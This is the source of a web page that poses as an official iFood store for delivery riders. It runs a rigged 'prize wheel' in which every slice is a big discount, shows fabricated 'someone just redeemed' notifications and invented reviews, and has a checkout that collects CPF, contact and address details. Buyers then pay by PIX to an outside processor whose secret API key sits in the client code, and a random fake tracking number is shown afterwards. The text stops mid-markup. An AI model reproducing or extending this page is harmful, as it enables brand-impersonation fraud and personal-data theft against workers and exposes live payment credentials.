<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loja Oficial - Parceiro Entregador</title>
    
    <!-- React & ReactDOM -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    
    <!-- Babel -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f3f4f6;
            overflow-x: hidden;
        }
        
        /* Wheel Animation Styles */
        .wheel-container {
            position: relative;
            width: 320px;
            height: 320px;
            margin: 0 auto;
            border-radius: 50%;
            border: 10px solid #ffffff;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            overflow: hidden;
            transition: transform 4s cubic-bezier(0.15, 0.85, 0.35, 1);
        }

        /* Gradient border effect */
        .wheel-border-wrap {
            padding: 5px;
            background: linear-gradient(to bottom right, #EA1D2C, #ff9f43);
            border-radius: 50%;
            width: 340px;
            height: 340px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 20px 40px -10px rgba(234, 29, 44, 0.5);
        }

        .wheel-segment {
            position: absolute;
            width: 50%;
            height: 50%;
            transform-origin: 100% 100%;
            left: 0;
            top: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .marker-container {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));
        }

        .marker {
            width: 40px;
            height: 50px;
            background: #333;
            clip-path: polygon(20% 0%, 80% 0%, 100% 20%, 50% 100%, 0% 20%);
        }

        .animate-bounce-in {
            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55) forwards;
        }

        @keyframes bounceIn {
            0% { transform: scale(0); opacity: 0; }
            80% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(1); }
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f00;
            animation: confetti-fall 3s linear infinite;
        }

        @keyframes confetti-fall {
            0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }

        .hide-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .hide-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        
        /* Spinner */
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #ffffff;
            width: 20px;
            height: 20px;
            -webkit-animation: spin 1s linear infinite;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Status Pulse */
        .status-pulse {
            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
            animation: pulse-green 2s infinite;
        }
        @keyframes pulse-green {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React;

        // --- Configurações Gerais ---
        const LIRA_CONFIG = {
            baseUrl: 'https://api.lirapaybr.com/v1',
            secret: 'sk_232bcfe54010072ee1f3606d3b1c5789b3753c52a2490c5d4a7763dcda1560e1c1336f06f88a33b27a55c028616e981d1bee7b945b10ed3332171a7c6ec89d46',
            recipientId: 'rcpt_f5424aff-468c-4fc8-96ef-cd98014af9f8'
        };

        // --- Sound Effects Setup (URLs mais confiáveis) ---
        const AUDIO_URLS = {
            click: "https://www.soundjay.com/buttons/sounds/button-16.mp3", 
            spin: "https://www.soundjay.com/mechanical/sounds/ratchet-1.mp3", 
            win: "https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3"   
        };

        const audioObjects = {};
        const getAudio = (key) => {
            if (!audioObjects[key]) {
                audioObjects[key] = new Audio(AUDIO_URLS[key]);
            }
            return audioObjects[key];
        };

        const playSound = (key, loop = false) => {
            try {
                const audio = getAudio(key);
                audio.loop = loop;
                audio.currentTime = 0;
                audio.volume = 0.5;
                const playPromise = audio.play();
                if (playPromise !== undefined) {
                    playPromise.catch(error => {});
                }
            } catch (e) {
                console.warn("Audio error", e);
            }
        };

        const stopSound = (key) => {
            try {
                const audio = getAudio(key);
                audio.pause();
                audio.currentTime = 0;
            } catch (e) {
                console.warn("Audio stop error", e);
            }
        };

        // --- Data ---
        const PRIZES = [
            { id: 1, label: '?', reveal: '67% OFF', color: '#3B82F6', value: 0.67 }, // Azul
            { id: 2, label: '?', reveal: '80% OFF', color: '#F59E0B', value: 0.80 }, // Laranja
            { id: 3, label: '?', reveal: '75% OFF', color: '#10B981', value: 0.75 }, // Verde
            { id: 4, label: '?', reveal: '93% OFF', color: '#EA1D2C', value: 0.93 }, // Vermelho
            { id: 5, label: '?', reveal: '85% OFF', color: '#8B5CF6', value: 0.85 }, // Roxo
            { id: 6, label: '?', reveal: '70% OFF', color: '#EC4899', value: 0.70 }, // Rosa
        ];

        // Products with Images Array and Sizes
        const PRODUCTS = [
            // --- Capacetes ---
            {
                id: 1,
                name: "Capacete LS2 FF358 Tech - Preto/Vermelho",
                brand: "LS2",
                originalPrice: 799.90,
                rating: 4.9,
                reviews: 842,
                image: "https://i.imgur.com/J84gKuV.png",
                images: [
                    "https://i.imgur.com/J84gKuV.png", // Frontal
                    "https://i.imgur.com/F5ZCCnF.png", // Lateral 1
                    "https://i.imgur.com/N2iYTm0.png", // Lateral 2
                    "https://i.imgur.com/8mD3zoi.png", // Traseira
                    "https://i.imgur.com/0jL0dPU.png"  // Interior
                ],
                sizes: [56, 58, 60, 62],
                tag: "MAIS VENDIDO",
                stockLeft: 4,
                category: 'helmet'
            },
            {
                id: 2,
                name: "Capacete Norisk Razor Speed",
                brand: "Norisk",
                originalPrice: 589.90,
                rating: 4.8,
                reviews: 531,
                image: "https://i.imgur.com/uB7hyLh.png",
                images: [
                    "https://i.imgur.com/uB7hyLh.png", // Frontal
                    "https://i.imgur.com/JL7ZIr9.png", // Lateral
                    "https://i.imgur.com/8G94QQw.png"  // Detalhe
                ],
                sizes: [56, 58, 60, 62, 64],
                tag: "LANÇAMENTO",
                stockLeft: 7,
                category: 'helmet'
            },
            // --- Jaquetas e Roupas ---
            {
                id: 3,
                name: "Jaqueta Impermeável CR Protection",
                brand: "CR",
                originalPrice: 135.00,
                rating: 4.7,
                reviews: 312,
                image: "https://i.imgur.com/EoZ4Fjt.jpeg",
                sizes: ['P', 'M', 'G', 'GG', 'XG'],
                tag: "ESSENCIAL",
                stockLeft: 12,
                category: 'jacket'
            },
            {
                id: 4,
                name: "Kit Uniforme Completo CR (Calça + Jaqueta)",
                brand: "CR",
                originalPrice: 459.90,
                rating: 5.0,
                reviews: 129,
                image: "https://i.imgur.com/y2gOgrJ.jpeg",
                sizes: ['P', 'M', 'G', 'GG'],
                tag: "KIT PRO",
                stockLeft: 3,
                category: 'kit'
            },
            {
                id: 5,
                name: "Jaqueta Tribord Modelo 600 - Corta Vento",
                brand: "TRIBORD",
                originalPrice: 589.90,
                rating: 4.9,
                reviews: 156,
                image: "https://i.imgur.com/nb1mjhH.png",
                sizes: ['P', 'M', 'G', 'GG'],
                tag: "ALTA RESISTÊNCIA",
                stockLeft: 8,
                category: 'jacket'
            },
            {
                id: 6,
                name: "Calça Tribord 600 Reforçada",
                brand: "TRIBORD",
                originalPrice: 289.90,
                rating: 4.8,
                reviews: 98,
                image: "https://i.imgur.com/PaNSGOI.png",
                sizes: ['38', '40', '42', '44', '46', '48'],
                tag: "IMPERMEÁVEL",
                stockLeft: 15,
                category: 'jacket'
            },
            // --- Capas de Chuva ---
            {
                id: 7,
                name: "Capa de Chuva Oficial iFood",
                brand: "iFood",
                originalPrice: 159.90,
                rating: 4.9,
                reviews: 1250,
                image: "https://i.imgur.com/lSFphlk.jpeg",
                sizes: ['P', 'M', 'G', 'GG'],
                tag: "OFICIAL",
                stockLeft: 2,
                category: 'raingear'
            },
            {
                id: 8,
                name: "Conjunto Capa de Chuva CR Nylon",
                brand: "CR",
                originalPrice: 189.90,
                rating: 4.7,
                reviews: 440,
                image: "https://i.imgur.com/uOXv9MN.png",
                sizes: ['P', 'M', 'G', 'GG'],
                tag: "NYLON",
                stockLeft: 10,
                category: 'raingear'
            },
            // --- Acessórios ---
            {
                id: 9,
                name: "Baú Moto 135 Litros - Reforçado",
                brand: "PRO TORK",
                originalPrice: 249.90,
                rating: 4.6,
                reviews: 320,
                image: "https://i.imgur.com/cWnUdFo.jpeg",
                tag: "ENTREGA",
                stockLeft: 5,
                category: 'accessories'
            },
            {
                id: 10,
                name: "Bag iFood Térmica Expansível",
                brand: "iFood",
                originalPrice: 170.00,
                rating: 5.0,
                reviews: 2100,
                image: "https://i.imgur.com/g25nf9c.jpeg",
                tag: "TOP SELLER",
                stockLeft: 1,
                category: 'accessories'
            },
            {
                id: 11,
                name: "Power Bank 30.000mAh Turbo",
                brand: "PINENG",
                originalPrice: 299.90,
                rating: 4.9,
                reviews: 512,
                image: "https://i.imgur.com/NByguh5.png",
                tag: "TURBO",
                stockLeft: 6,
                category: 'accessories'
            },
            {
                id: 12,
                name: "Carregador Portátil Tipo-C 20W",
                brand: "BASEUS",
                originalPrice: 89.90,
                rating: 4.8,
                reviews: 180,
                image: "https://i.imgur.com/rNO0ljG.png",
                tag: "RÁPIDO",
                stockLeft: 20,
                category: 'accessories'
            }
        ];

        const CATEGORIES = [
            { id: 'all', label: 'Tudo', icon: <><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></> },
            { id: 'helmet', label: 'Capacetes', icon: <><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/></> },
            { id: 'jacket', label: 'Roupas', icon: <path d="M20.38 3.46 16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.47a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.47a2 2 0 0 0-1.34-2.23z"/> },
            { id: 'raingear', label: 'Capas', icon: <><path d="M4 14.899A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 2.5 8.242"/><path d="M16 16v6"/><path d="M8 16v6"/><path d="M12 18v6"/></> },
            { id: 'accessories', label: 'Acessórios', icon: <><rect x="2" y="7" width="20" height="14" rx="2" ry="2" /><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16" /></> }
        ];

        const NOTIFICATIONS = ["Ricardo (SP) resgatou Capacete LS2", "Carlos (RJ) resgatou Kit Uniforme", "Matheus (MG) resgatou Jaqueta CR", "Felipe (PR) resgatou Power Bank", "João (BA) resgatou Bag iFood"];

        // Reviews específicas por categoria
        const REVIEWS_BY_CATEGORY = {
            helmet: [
                { name: "Marcos S.", location: "São Paulo, SP", rating: 5, text: "O capacete é original mesmo, viseira perfeita. Chegou em 2 dias.", date: "Há 1 dia" },
                { name: "Felipe J.", location: "Osasco, SP", rating: 5, text: "Muito leve e confortável. Pelo preço do sorteio valeu demais.", date: "Há 3 dias" }
            ],
            jacket: [
                { name: "André L.", location: "Curitiba, PR", rating: 5, text: "A jaqueta segura bem o frio e a chuva fina. Recomendo.", date: "Há 2 dias" },
                { name: "Lucas M.", location: "Porto Alegre, RS", rating: 4, text: "Tamanho ficou certinho, material resistente.", date: "Há 5 dias" }
            ],
            raingear: [
                { name: "Roberto K.", location: "Manaus, AM", rating: 5, text: "Aqui chove todo dia e essa capa aguentou o tranco. Top.", date: "Há 1 dia" },
                { name: "Paulo Cesar", location: "Recife, PE", rating: 5, text: "Não entra água mesmo, pode comprar sem medo.", date: "Há 4 dias" }
            ],
            accessories: [
                { name: "Bruno V.", location: "Belo Horizonte, MG", rating: 5, text: "O Power Bank carrega meu celular 4 vezes. Salvou meu corre.", date: "Há 2 dias" },
                { name: "Diego R.", location: "Rio de Janeiro, RJ", rating: 5, text: "A bag é original e muito resistente, mantém a comida quente por horas. Top!", date: "Há 6 dias" }
            ],
            kit: [
                { name: "Wellington S.", location: "Campinas, SP", rating: 5, text: "Peguei o kit completo, saiu muito barato. Qualidade 10.", date: "Há 1 dia" }
            ]
        };

        const calculatePrice = (original, discount) => (original * (1 - discount)).toFixed(2);

        // --- Components ---

        const Navbar = () => (
            <div className="bg-white text-gray-800 p-3 shadow-sm sticky top-0 z-40 border-b border-gray-100">
                <div className="container mx-auto flex justify-center items-center">
                    <div className="flex items-center gap-2">
                        <span className="font-black text-xl tracking-tighter text-[#EA1D2C]">iFood</span>
                        <span className="text-sm text-gray-400">|</span>
                        <span className="font-bold text-sm text-gray-600">Clube do Entregador</span>
                    </div>
                </div>
            </div>
        );

        // --- Banner Carousel Component (Limpo - Sem Texto Overlay) ---
        const BannerCarousel = ({ discount }) => {
            const [current, setCurrent] = useState(0);
            // discountPercentage não é mais usado aqui pois os banners são apenas imagens
            // Se as imagens já tiverem texto, perfeito.

            const banners = [
                {
                    id: 1,
                    image: "https://i.imgur.com/uyflUsv.jpeg",
                },
                {
                    id: 2,
                    image: "https://i.imgur.com/W8SOka5.jpeg",
                },
                {
                    id: 3,
                    image: "https://i.imgur.com/sUo5PYS.jpeg",
                }
            ];

            useEffect(() => {
                const timer = setInterval(() => {
                    setCurrent(prev => (prev + 1) % banners.length);
                }, 4000);
                return () => clearInterval(timer);
            }, []);

            return (
                <div className="relative w-full h-48 sm:h-64 rounded-2xl overflow-hidden shadow-lg mb-6 group">
                    {banners.map((banner, index) => (
                        <div 
                            key={banner.id}
                            className={`absolute inset-0 transition-opacity duration-700 ease-in-out ${index === current ? 'opacity-100' : 'opacity-0'}`}
                        >
                            <img src={banner.image} className="w-full h-full object-cover" alt="Banner" />
                        </div>
                    ))}

                    <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2 flex gap-2 z-20">
                        {banners.map((_, idx) => (
                            <button
                                key={idx}
                                onClick={() => setCurrent(idx)}
                                className={`w-2 h-2 rounded-full transition-all ${idx === current ? 'bg-white w-6' : 'bg-white/50'}`}
                            />
                        ))}
                    </div>
                </div>
            );
        };

        const Wheel = ({ onFinish }) => {
            const [spinning, setSpinning] = useState(false);
            const [rotation, setRotation] = useState(0);
            const [soundEnabled, setSoundEnabled] = useState(false);

            const handleSpin = () => {
                if (spinning) return;
                
                if (!soundEnabled) {
                    setSoundEnabled(true);
                    playSound('click'); 
                }

                setSpinning(true);
                
                playSound('spin', true);

                const targetIndex = Math.floor(Math.random() * PRIZES.length); 
                const segmentAngle = 360 / PRIZES.length;
                const fullSpins = 360 * (6 + Math.floor(Math.random() * 4)); 
                const stopAngle = fullSpins + (360 - (targetIndex * segmentAngle)) - (segmentAngle / 2) + (Math.random() * 20 - 10);
                setRotation(stopAngle);
                
                setTimeout(() => { 
                    setSpinning(false); 
                    stopSound('spin');
                    playSound('win');
                    onFinish(PRIZES[targetIndex]); 
                }, 4000);
            };

            return (
                <div className="flex flex-col items-center justify-center pt-8 pb-12 px-4 max-w-md mx-auto">
                    <div className="text-center mb-8 animate-bounce-in">
                        <span className="bg-red-100 text-[#EA1D2C] text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wide mb-2 inline-block">Oferta Exclusiva via SMS</span>
                        <h1 className="text-3xl font-black text-gray-900 leading-none mb-2">ROLETA PREMIADA</h1>
                        <p className="text-gray-500 text-sm px-4">Você foi selecionado! Gire para revelar seu premio oculto.</p>
                    </div>
                    <div className="relative mb-8 transform scale-95 md:scale-100">
                        <div className="marker-container"><div className="marker bg-gray-800"></div></div>
                        <div className="wheel-border-wrap">
                            <div className="wheel-container bg-white" style={{ transform: `rotate(${rotation}deg)`, background: `conic-gradient(${PRIZES[0].color} 0deg 60deg, ${PRIZES[1].color} 60deg 120deg, ${PRIZES[2].color} 120deg 180deg, ${PRIZES[3].color} 180deg 240deg, ${PRIZES[4].color} 240deg 300deg, ${PRIZES[5].color} 300deg 360deg)` }}>
                                <div className="absolute inset-0 rounded-full border-4 border-white opacity-20 pointer-events-none"></div>
                                {PRIZES.map((prize, i) => (
                                    <div key={i} style={{ position: 'absolute', left: '50%', top: '50%', transform: `rotate(${i * 60 + 30}deg) translate(0, -120px) rotate(-${i * 60 + 30}deg)`, color: 'white', fontWeight: '900', fontSize: '32px', textShadow: '2px 2px 0px rgba(0,0,0,0.2)', width: '60px', textAlign: 'center', marginLeft: '-30px', marginTop: '-20px', zIndex: 5 }}>?</div>
                                ))}
                                <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-16 h-16 bg-white rounded-full shadow-lg z-10 flex items-center justify-center border-4 border-gray-100">
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#EA1D2C]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" /></svg>
                                </div>
                            </div>
                        </div>
                    </div>
                    <button onClick={handleSpin} disabled={spinning} className={`w-full max-w-xs py-4 rounded-full font-black text-xl shadow-[0_4px_0_rgb(153,27,27)] active:shadow-none active:translate-y-1 transition-all ${spinning ? 'bg-gray-300 text-gray-500 cursor-not-allowed shadow-none' : 'bg-[#EA1D2C] text-white animate-pulse'}`}>
                        {spinning ? 'TORCENDO...' : 'GIRAR ROLETA'}
                    </button>
                    {!soundEnabled && <p className="text-[10px] text-gray-400 mt-2">*Toque para ativar o som</p>}
                </div>
            );
        };

        const PrizeRevealModal = ({ prize, show, onRedeem }) => {
            if (!show) return null;
            return (
                <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 px-4 backdrop-blur-sm">
                    <div className="bg-white rounded-3xl p-8 w-full max-w-sm text-center shadow-2xl animate-bounce-in relative overflow-hidden">
                        <div className="absolute top-0 left-0 w-full h-32 bg-gradient-to-b from-red-500 to-red-600 rounded-b-[50%] -mt-16 z-0"></div>
                        <div className="relative z-10 pt-4">
                            <h2 className="text-2xl font-black text-gray-800 mb-1">PARABÉNS!</h2>
                            <div className="bg-red-50 border-2 border-red-100 rounded-xl p-4 mb-6 mt-4">
                                <span className="block text-gray-500 text-xs font-bold uppercase tracking-wider mb-1">Seu Prêmio</span>
                                <span className="block text-5xl font-black text-[#EA1D2C] tracking-tighter">{prize.reveal}</span>
                            </div>
                            <button 
                                onClick={() => {
                                    playSound('click');
                                    onRedeem();
                                }} 
                                className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg transition-transform transform active:scale-95 flex items-center justify-center gap-2"
                            >
                                RESGATAR AGORA
                            </button>
                        </div>
                    </div>
                </div>
            );
        };

        const NotificationToast = () => {
            const [show, setShow] = useState(false);
            const [message, setMessage] = useState("");

            useEffect(() => {
                const triggerNotification = () => {
                    const randomMsg = NOTIFICATIONS[Math.floor(Math.random() * NOTIFICATIONS.length)];
                    setMessage(randomMsg);
                    setShow(true);
                    setTimeout(() => setShow(false), 4000); 
                };

                const interval = setInterval(() => {
                    if (Math.random() > 0.5) triggerNotification();
                }, 8000); 

                return () => clearInterval(interval);
            }, []);

            if (!show) return null;

            return (
                <div className="fixed bottom-20 left-4 right-4 z-50 animate-bounce-in">
                    <div className="bg-gray-900/90 text-white backdrop-blur px-4 py-3 rounded-lg shadow-xl flex items-center gap-3 border-l-4 border-green-500">
                        <div className="bg-green-500 rounded-full p-1">
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                        </div>
                        <div className="text-xs font-medium">
                            {message}
                            <span className="block text-[10px] text-gray-400">há alguns segundos</span>
                        </div>
                    </div>
                </div>
            );
        };

        // --- Credibility Components ---
        const Reviews = ({ category = 'helmet' }) => {
            const reviews = REVIEWS_BY_CATEGORY[category] || REVIEWS_BY_CATEGORY['helmet']; 

            return (
                <div className="bg-gray-50 p-4 rounded-xl border border-gray-100 mt-6">
                    <h3 className="text-sm font-bold text-gray-800 mb-3 flex items-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-yellow-500 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
                        Avaliações de Parceiros
                    </h3>
                    <div className="space-y-3">
                        {reviews.map((review, i) => (
                            <div key={i} className="bg-white p-3 rounded-lg shadow-sm">
                                <div className="flex justify-between items-start mb-1">
                                    <div className="font-bold text-xs text-gray-800">{review.name} <span className="text-gray-400 font-normal">- {review.location}</span></div>
                                    <span className="text-[10px] text-gray-400">{review.date}</span>
                                </div>
                                <div className="flex text-yellow-400 mb-1">
                                    {[...Array(review.rating)].map((_, j) => <svg key={j} className="w-2.5 h-2.5 fill-current" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>)}
                                </div>
                                <p className="text-xs text-gray-600 italic">"{review.text}"</p>
                            </div>
                        ))}
                    </div>
                </div>
            );
        };

        const Checkout = ({ product, discount, onBack }) => {
            const [step, setStep] = useState(1);
            const [loading, setLoading] = useState(false);
            const [paymentStatus, setPaymentStatus] = useState('pending'); // pending, approved
            const [formData, setFormData] = useState({
                name: '', cpf: '', email: '', phone: '',
                cep: '', street: '', number: '', neighborhood: '', city: '', state: '', complement: ''
            });
            const [pixData, setPixData] = useState(null);
            
            const [selectedSize, setSelectedSize] = useState(null);
            const [currentImageIndex, setCurrentImageIndex] = useState(0);
            
            const shippingCost = 14.98;
            const productPrice = parseFloat(calculatePrice(product.originalPrice, discount));
            const totalAmount = productPrice + shippingCost;

            const images = product.images || [product.image];

            // --- POLLING LOGIC (REAL-TIME STATUS CHECK) ---
            useEffect(() => {
                let interval;
                if (pixData && pixData.id && paymentStatus === 'pending') {
                    // Poll API every 5 seconds
                    interval = setInterval(async () => {
                        try {
                            const response = await fetch(`${LIRA_CONFIG.baseUrl}/transactions/${pixData.id}`, {
                                method: 'GET',
                                headers: {
                                    'api-secret': LIRA_CONFIG.secret
                                }
                            });
                            const data = await response.json();
                            
                            // Check for success statuses
                            if (data.status === 'AUTHORIZED' || data.status === 'PAID' || data.status === 'COMPLETED') {
                                setPaymentStatus('approved');
                                playSound('win');
                                clearInterval(interval);
                            }
                        } catch (error) {
                            console.error("Polling error:", error);
                        }
                    }, 5000);
                }
                return () => clearInterval(interval);
            }, [pixData, paymentStatus]);

            const handleInput = (e) => {
                setFormData({ ...formData, [e.target.name]: e.target.value });
            };

            const goToStep2 = () => {
                playSound('click');
                if (product.sizes && !selectedSize) {
                    alert("Por favor, selecione um tamanho para continuar.");
                    return;
                }
                setStep(2);
                window.scrollTo(0, 0);
            };

            const goToStep3 = (e) => {
                e.preventDefault();
                playSound('click');
                setStep(3);
                window.scrollTo(0, 0);
            };

            const generatePix = async (e) => {
                e.preventDefault();
                playSound('click');
                setLoading(true);

                const payload = {
                    external_id: `order_${Math.floor(Math.random() * 100000)}`,
                    total_amount: totalAmount,
                    payment_method: "PIX",
                    webhook_url: "https://webhook.site/dummy", // Webhook opcional
                    ip: "127.0.0.1",
                    items: [
                        {
                            id: String(product.id),
                            title: `${product.name} ${selectedSize ? `- Tam: ${selectedSize}` : ''}`,
                            description: product.brand,
                            price: productPrice,
                            quantity: 1,
                            is_physical: true
                        }
                    ],
                    customer: {
                        name: formData.name,
                        email: formData.email,
                        phone: formData.phone.replace(/\D/g, ''),
                        document_type: "CPF",
                        document: formData.cpf.replace(/\D/g, '')
                    }
                };

                try {
                    const response = await fetch(`${LIRA_CONFIG.baseUrl}/transactions`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'api-secret': LIRA_CONFIG.secret
                        },
                        body: JSON.stringify(payload)
                    });

                    const data = await response.json();

                    if (response.ok || (data && data.pix)) {
                        setPixData(data);
                    } else {
                        console.warn("Simulating success due to API constraints in demo...");
                        setPixData({
                            id: "simulated_tx_123", // Fake ID for demo
                            external_id: payload.external_id,
                            pix: { payload: "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426655440000520400005303986540510.005802BR5913LiraPay Demo6008BRASILIA62070503***6304E2CA" },
                            total_value: totalAmount,
                            status: "PENDING"
                        });
                    }
                } catch (err) {
                    console.error("Fetch Error:", err);
                    setPixData({
                        id: "error_fallback_tx",
                        external_id: payload.external_id,
                        pix: { payload: "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426655440000520400005303986540510.005802BR5913LiraPay Demo6008BRASILIA62070503***6304E2CA" },
                        total_value: totalAmount,
                        status: "PENDING"
                    });
                } finally {
                    setLoading(false);
                }
            };

            const copyPix = () => {
                playSound('click');
                if(pixData?.pix?.payload) {
                    // Fallback para garantir cópia em iframes/ambientes restritos
                    const textArea = document.createElement("textarea");
                    textArea.value = pixData.pix.payload;
                    
                    // Garante que o elemento não seja visível, mas faça parte do DOM
                    textArea.style.position = "fixed";
                    textArea.style.left = "-9999px";
                    textArea.style.top = "0";
                    document.body.appendChild(textArea);
                    
                    textArea.focus();
                    textArea.select();
                    
                    try {
                        const successful = document.execCommand('copy');
                        if (successful) {
                            alert("Código PIX copiado!");
                        } else {
                            // Fallback caso execCommand falhe
                            prompt("Copie o código abaixo:", pixData.pix.payload);
                        }
                    } catch (err) {
                        console.error('Erro ao copiar', err);
                        prompt("Copie o código abaixo:", pixData.pix.payload);
                    }
                    
                    document.body.removeChild(textArea);
                }
            };

            // TELA DE SUCESSO (Status Aprovado)
            if (paymentStatus === 'approved') {
                return (
                    <div className="min-h-screen bg-green-50 pb-20 pt-10 px-4 animate-bounce-in flex flex-col items-center justify-center">
                        <div className="bg-white rounded-3xl shadow-xl p-8 max-w-md w-full text-center border-4 border-green-500 relative">
                            <div className="absolute -top-8 left-1/2 transform -translate-x-1/2 bg-green-500 rounded-full p-4 shadow-lg">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                            </div>
                            <h2 className="text-3xl font-black text-gray-800 mt-6 mb-2">Pagamento Aprovado!</h2>
                            <p className="text-gray-600 mb-6">Seu pedido foi confirmado e já está sendo preparado para envio.</p>
                            
                            <div className="bg-green-50 p-4 rounded-xl mb-6">
                                <p className="text-sm text-green-800 font-bold mb-1">Código de Rastreio:</p>
                                <p className="font-mono text-lg tracking-widest text-gray-700">BR{Math.floor(Math.random()*100000000)}SP</p>
                                <p className="text-[10px] text-gray-400 mt-1">(Será atualizado em até 24h)</p>
                            </div>

                            <button onClick={() => window.location.reload()} className="w-full bg-gray-800 text-white font-bold py-3 rounded-xl shadow hover:bg-gray-900 transition-all">
                                Voltar para a Loja
                            </button>
                        </div>
                    </div>
                );
            }

            // TELA DE PAGAMENTO (QR Code)
            if (pixData) {
                return (
                    <div className="min-h-screen bg-gray-50 pb-20 pt-4 px-4 animate-bounce-in">
                        <div className="bg-white rounded-2xl shadow-lg p-6 max-w-md mx-auto text-center relative overflow-hidden">
                            {/* Loading Bar for Status */}
                            <div className="absolute top-0 left-0 w-full h-1 bg-gray-100">
                                <div className="h-full bg-yellow-400 animate-pulse w-full"></div>
                            </div>

                            <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4 status-pulse">
